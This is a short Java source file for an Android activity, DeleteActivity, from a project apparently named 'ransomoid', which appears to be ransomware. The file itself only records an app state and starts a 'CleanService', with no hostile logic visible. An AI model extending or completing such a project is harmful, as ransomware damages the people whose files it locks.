package falezza.fabio.ransomoid.activities;

import android.content.Intent;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;

import falezza.fabio.ransomoid.AppState;
import falezza.fabio.ransomoid.R;
import falezza.fabio.ransomoid.services.CleanService;
import falezza.fabio.ransomoid.utils.AppDelegate;

public class DeleteActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_delete);

        String state = AppDelegate.getInstance(this).getByTag(AppDelegate.appState);
        if (!state.equals(AppState.DELETED.toString())) {
            AppDelegate.getInstance(this).saveAppState(AppState.OPENED);
        }

        Intent cleanService = new Intent(this, CleanService.class);
        this.startService(cleanService);
    }
}
